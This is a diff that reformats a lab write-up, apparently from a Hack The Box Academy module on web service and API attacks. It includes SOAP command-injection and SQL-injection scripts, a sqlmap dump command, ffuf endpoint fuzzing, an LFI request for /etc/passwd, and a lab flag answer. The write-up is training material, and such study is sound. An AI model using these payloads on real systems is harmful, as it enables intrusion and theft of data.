@@ -98,26 +98,23 @@ GPT explanation:
 #### Technical Methodology & Exploit Execution:
 
 we will use the following python script:
+
+```python
 import requests
 
-payload = '<?xml version="1.0" encoding="utf-
-8"?><soap:Envelope
-xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-xmlns:tns="http://tempuri.org/"
-xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soa
-p:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>uname
--m</cmd></LoginRequest></soap:Body></soap:Envelope>'
+payload = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
+<soap:Body>
+<LoginRequest xmlns="http://tempuri.org/">
+<cmd>uname -m</cmd>
+</LoginRequest>
+</soap:Body>
+</soap:Envelope>'''
 
-print(requests.post("http://<TARGET-IP>:3002/wsdl",
-data=payload,
-headers={"SOAPAction":'"ExecuteCommand"'}).content)
-saved in the pwnbox as script.py:
-
-The marked part is the command being run – 'uname -m' – the command being
-```bash
-use to determine the machine's architecture:
+print(requests.post("http://<TARGET-IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 ```
+
+saved in the pwnbox as `script.py`. The marked part is the command being run – `uname -m` – the command used to determine the machine's architecture:
 
 We can see the architecture in the 'result' tag.
 
@@ -177,7 +174,7 @@ curl http://<target-IP>:3003/?id=3
 
 we will use sqlmap:
 ```bash
-sqlmap http://<target-IP>:3003/?id=1 --batch –dump -v 0
+sqlmap http://<target-IP>:3003/?id=1 --batch --dump -v 0
 ```
 ('-batch' is to automatically answer prompts with default answers, '-dump' is to
 dump the databases, '-v 0' is to suppress noise in the output)
@@ -203,7 +200,7 @@ dump the databases, '-v 0' is to suppress noise in the output)
 #### Technical Methodology & Exploit Execution:
 
 we now to go port 3001 of the target machine:
-http://<target-IP>:3001/
+`http://<target-IP>:3001/`
 
 
 
@@ -245,8 +242,8 @@ Lets run API endpoint brute force using the wordlist 'common-api-endpoints-
 mazen160.txt' – downloaded manually to the pwnbox, and the tool ffuf:
 ```bash
 ffuf -w "common-api-endpoints-mazen160.txt" -u
+'http://`<target-IP>`:3000/api/FUZZ' -s
 ```
-'http://<target-IP>:3000/api/FUZZ' -s
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/web-service-and-api-attacks/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -274,7 +271,7 @@ We need a file name.
 We will use LFI to get the content of the users, from '/etc/passwd', and filtering
 for 'ub':
 curl
-http://10.129.152.166:3000/api/download/..%2f..%2f..%2f..%2f
+`http://10.129.152.166:3000/api/download/..%2f..%2f..%2f..%2f`
 etc%2fpasswd | grep ub
 
 ![Figure 7.1 — Lab execution and output verification (Page 7)](/assets/images/posts/htb-academy/web-service-and-api-attacks/p007_01.jpg)
@@ -345,7 +342,7 @@ successfully only after submitting the proper SQLi payload, otherwise it will
 hang or throw an error .
 Answer: FLAG{1337_SQL_INJECTION_IS_FUN_:)}
 Method: we will start by entering:
-http://<target-IP>:3001
+`http://<target-IP>:3001`
 
 
 
@@ -361,7 +358,7 @@ The parameters can be susceptible to SQL injection, however we will not
 trigger it regularly, but using SOAP (Simple Object Access Protocol)
 
 we send SOAP (Simple Object Access Protocol) to the server WSDL page:
-http://<target-IP>:3002/wsdl
+`http://<target-IP>:3002/wsdl`
 
 ![Figure 10.1 — Lab execution and output verification (Page 10)](/assets/images/posts/htb-academy/web-service-and-api-attacks/p010_01.jpg)
 *_Figure 10.1 — Lab execution and output verification (Page 10)_*
@@ -377,7 +374,7 @@ first – some explanation about the SOAP and WSDL:
 
 
 The WSDL can be found in
-http://10.129.202.133:3002/wsdl?wsdl
+`http://10.129.202.133:3002/wsdl?wsdl`
 
 
 *
@@ -405,18 +402,12 @@ parameter – we will make sure to include SQL injection of the format:
 admin' or '1'='1
 * more of SQL injection was covered in 'SQL Injection Fundamentals' module
 →  'Subverting Query Logic' section (page 7). *:
+```python
 import requests
 
-# Crafting the SOAP payload with SQL injection in the
-username parameter
+# Crafting the SOAP payload with SQL injection in the username parameter
 payload = '''<?xml version="1.0" encoding="utf-8"?>
-<soap:Envelope
-xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-
-instance"
-xmlns:tns="http://tempuri.org/"
-
-xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
 <soap:Body>
 <LoginRequest xmlns="http://tempuri.org/">
 <username>admin' or '1'='1</username>
@@ -427,18 +418,19 @@ xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
 
 # Sending the SOAP request to the target
 response = requests.post(
-"http://<target-IP>:3002/wsdl",  # SOAP endpoint
-data=payload,
-headers={
-"SOAPAction": '"Login"',  # Specifying the Login
-SOAP action
-"Content-Type": "text/xml; charset=utf-8"
-}
+    "http://<target-IP>:3002/wsdl",  # SOAP endpoint
+    data=payload,
+    headers={
+        "SOAPAction": '"Login"',  # Specifying the Login SOAP action
+        "Content-Type": "text/xml; charset=utf-8"
+    }
 )
 
 # Printing the server's response
 print(response.content)
-*make sure to replace <target-IP> in the script to the target IP *
+```
+
+*make sure to replace `<target-IP>` in the script to the target IP.*
 
 
 
